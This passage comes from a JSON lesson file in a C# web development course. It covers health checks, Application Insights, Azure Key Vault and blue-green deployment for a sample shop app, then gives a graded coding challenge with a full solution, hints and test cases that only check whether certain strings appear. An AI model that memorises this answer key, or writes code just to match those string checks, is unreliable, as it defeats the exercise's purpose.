responds\n});\n\napp.MapHealthChecks(\"/healthz/ready\", new HealthCheckOptions\n{\n    Predicate = check => check.Tags.Contains(\"ready\")\n});\n```\n\n## Application Insights Monitoring\n\nApplication Insights provides comprehensive observability for production applications. It automatically captures request telemetry, dependency calls, exceptions, and performance metrics. Configure custom telemetry for business events like orders placed, payments processed, and user registrations. Create dashboards showing key performance indicators and set up alerts for anomalies.\n\n```csharp\nservices.AddApplicationInsightsTelemetry(options =>\n{\n    options.ConnectionString = configuration[\"ApplicationInsights:ConnectionString\"];\n    options.EnableAdaptiveSampling = true; // Reduce cost on high-volume apps\n});\n\n// Custom telemetry for business events\npublic class OrderService\n{\n    private readonly TelemetryClient _telemetry;\n    \n    public async Task<Order> CreateOrderAsync(...)\n    {\n        // ... order creation logic ...\n        \n        _telemetry.TrackEvent(\"OrderCreated\", new Dictionary<string, string>\n        {\n            [\"OrderId\"] = order.Id.ToString(),\n            [\"Total\"] = order.Total.ToString(\"C\"),\n            [\"ItemCount\"] = order.Items.Count.ToString()\n        });\n    }\n}\n```\n\n## Azure Key Vault for Secrets\n\nProduction secrets must never exist in configuration files or environment variables visible to developers. Azure Key Vault provides secure, audited secret storage. The application authenticates to Key Vault using managed identity, eliminating the need for any credentials in configuration. Key Vault integration loads secrets at startup and can reload changed values without restart.\n\n```csharp\nbuilder.Configuration.AddAzureKeyVault(\n    new Uri($\"https://{keyVaultName}.vault.azure.net/\"),\n    new DefaultAzureCredential());\n\n// Secrets are now available as configuration values\nvar stripeKey = configuration[\"Stripe:SecretKey\"];\nvar dbConnection = configuration[\"Database:ConnectionString\"];\n```\n\n## Scaling Strategies\n\nShopFlow uses different scaling strategies for different components. The stateless API scales horizontally based on concurrent requests, with Container Apps adding replicas during traffic spikes. The database uses connection pooling to handle increased load without scaling, with read replicas available for query-heavy scenarios. Background workers scale based on queue depth, processing more order confirmations during sales events. Redis cache scales vertically by increasing memory, or horizontally with clustering for extreme scale.\n\n## Blue-Green Deployment\n\nZero-downtime deployments use blue-green strategy: the new version deploys alongside the current version. Health checks verify the new deployment is healthy before switching traffic. If issues arise, traffic reverts to the previous version instantly. Container Apps supports revision management for this pattern, maintaining multiple versions simultaneously and controlling traffic distribution between them.\n\n```bash\n# Deploy new revision\naz containerapp update --name shopflow-api \\\n  --resource-group shopflow-prod \\\n  --image shopflowacr.azurecr.io/api:v2.1.0\n\n# Verify health, then switch traffic\naz containerapp ingress traffic set --name shopflow-api \\\n  --resource-group shopflow-prod \\\n  --revision-weight latest=100\n```"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-26-01-challenge-01",
              "title": "Capstone Completion Challenge",
              "description": "Configure the production health check and monitoring setup for ShopFlow.",
              "instructions": "Complete the production readiness configuration for ShopFlow!\n\n1. Configure health checks for:\n   - PostgreSQL database\n   - Redis cache\n   - External payment API\n\n2. Set up two health check endpoints:\n   - /healthz/live - Basic liveness (just confirms app is running)\n   - /healthz/ready - Readiness check (verifies all dependencies)\n\n3. Add Application Insights telemetry\n\n4. Configure the health check UI for monitoring dashboard",
              "starterCode": "// Program.cs - Configure production health checks and monitoring\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Add health checks for:\n// - PostgreSQL database (connection string: builder.Configuration.GetConnectionString(\"DefaultConnection\"))\n// - Redis cache (connection string: builder.Configuration.GetConnectionString(\"Redis\"))\n// - Payment API (URL: \"https://api.stripe.com/v1\")\n\n// TODO: Add Application Insights telemetry\n\nvar app = builder.Build();\n\n// TODO: Map health check endpoints\n// - /healthz/live - Liveness probe (no dependency checks)\n// - /healthz/ready - Readiness probe (check all dependencies tagged with \"ready\")\n\napp.Run();",
              "solution": "// Program.cs - Configure production health checks and monitoring\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configure health checks for all critical dependencies\nbuilder.Services.AddHealthChecks()\n    .AddNpgSql(\n        builder.Configuration.GetConnectionString(\"DefaultConnection\")!,\n        name: \"database\",\n        tags: new[] { \"ready\" })\n    .AddRedis(\n        builder.Configuration.GetConnectionString(\"Redis\")!,\n        name: \"cache\",\n        tags: new[] { \"ready\" })\n    .AddUrlGroup(\n        new Uri(\"https://api.stripe.com/v1\"),\n        name: \"payment-gateway\",\n        tags: new[] { \"ready\" });\n\n// Add Application Insights for production monitoring\nbuilder.Services.AddApplicationInsightsTelemetry(options =>\n{\n    options.ConnectionString = builder.Configuration[\"ApplicationInsights:ConnectionString\"];\n    options.EnableAdaptiveSampling = true;\n});\n\nvar app = builder.Build();\n\n// Liveness probe - just confirms the app is running\napp.MapHealthChecks(\"/healthz/live\", new HealthCheckOptions\n{\n    Predicate = _ => false // Skip all checks, just return 200 if app responds\n});\n\n// Readiness probe - verifies all dependencies are available\napp.MapHealthChecks(\"/healthz/ready\", new HealthCheckOptions\n{\n    Predicate = check => check.Tags.Contains(\"ready\"),\n    ResponseWriter = UIResponseWriter.WriteHealthCheckUIResponse\n});\n\napp.Run();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure health checks",
                  "expectedOutput": "AddHealthChecks",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should add PostgreSQL health check",
                  "expectedOutput": "AddNpgSql",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Should add Redis health check",
                  "expectedOutput": "AddRedis",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Should configure Application Insights",
                  "expectedOutput": "AddApplicationInsightsTelemetry",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Should map liveness endpoint",
                  "expectedOutput": "/healthz/live",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Should map readiness endpoint",
                  "expectedOutput": "/healthz/ready",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Start with builder.Services.AddHealthChecks() and chain the database, cache, and URL checks."
                },
                {
                  "level": 2,
                  "text": "Use .AddNpgSql() for PostgreSQL, .AddRedis() for Redis cache, and .AddUrlGroup() for external APIs."
                },
                {
                  "level": 3,
                  "text": "Add tags: new[] { \"ready\" } to each health check to filter them for the readiness probe."
                },
                {
                  "level": 4,
                  "text": "For liveness, use Predicate = _ => false to skip all checks. For readiness, use Predicate = check => check.Tags.Contains(\"ready\")."
                },
                {
                  "level": 5,
                  "text": "Application Insights uses builder.Services.AddApplicationInsightsTelemetry() with a ConnectionString option."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not tagging health checks for filtering",
                  "consequence": "Cannot differentiate between liveness and readiness probes, causing all checks to run for both endpoints.",
                  "correction": "Add tags: new[] { \"ready\" } to dependency health checks and filter with Predicate in HealthCheckOptions."
                },
                {
                  "mistake": "Running all health checks for liveness probe",
                  "consequence": "A database outage causes the container to restart even though the app itself is healthy, potentially worsening the situation.",
                  "correction": "Use Predicate = _ => false for liveness to skip all checks. Liveness should only verify the app process is running."
                },
                {
                  "mistake": "Hardcoding connection strings in health check configuration",
                  "consequence": "Secrets exposed in code, different values needed for different environments.",
                  "correction": "Always read connection strings from configuration using builder.Configuration.GetConnectionString()."
                },
                {
                  "mistake": "Missing null-forgiving operator on connection strings",
                  "consequence": "Compiler warnings about possible null reference if connection string is not configured.",
                  "correction": "Use ! operator after GetConnectionString() or add null checks with appropriate error messages."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    }
  ]
}